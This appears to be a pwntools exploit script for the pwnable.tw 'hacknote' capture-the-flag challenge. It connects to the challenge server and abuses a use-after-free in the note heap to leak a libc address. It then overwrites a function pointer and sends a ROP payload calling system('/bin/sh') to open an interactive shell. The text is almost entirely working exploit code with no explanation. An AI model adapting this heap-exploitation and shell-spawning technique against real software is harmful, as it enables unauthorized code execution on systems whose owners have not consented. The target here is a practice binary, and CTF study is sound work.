from pwn import *

exe = context.binary = ELF('./hacknote_patched', checksec=False)
# libc = ELF('/libc_32.so.6', checksec=False)
# r = process(exe.path)
# gdb.attach(r, api = True, gdbscript='''
#            b*0x8048a43
#            c
#            c 7
#            b*0x804893d
#            ''')

r = remote('chall.pwnable.tw', 10102)

def add(size, note):
    r.sendlineafter(b'choice :', b'1')
    r.sendlineafter(b'size :', str(size).encode('utf-8'))
    r.sendafter(b'Content :', note)
    
def delandprint(choice, index):
    r.sendlineafter(b'choice :', str(choice).encode('utf-8'))
    r.sendlineafter(b'Index :', str(index).encode('utf-8'))
    
libc_off = 0x1b0861
shellcall_off = 0x0005d24d
binsh_off = 0x158e8b
gets_off = 0x0005e890
ret_off = 0x0000018b
system_off = 0x0003a940

add(0x100, b'a') # 0
add(8, b'a') # 1
delandprint(2,0)
delandprint(2,1)

add(16, b'a') # 2
delandprint(3,2)
out = r.recv(4)
libc_leak = u32(out)

libc_base = libc_leak - libc_off
shellcall = libc_base + shellcall_off
binsh = libc_base + binsh_off
gets = libc_base + gets_off
ret = libc_base + ret_off
system = libc_base + system_off
print(hex(libc_base))

add(8, p32(shellcall))
delandprint(2,2)
add(0x50, b'/bin/sh\x00' + p32(binsh) + b'a'*12 + p32(gets))

delandprint(3,0)

payload = b'a'*12 + p32(ret)*3 + p32(system) + p32(0) + p32(binsh)
r.sendline(payload)

r.interactive()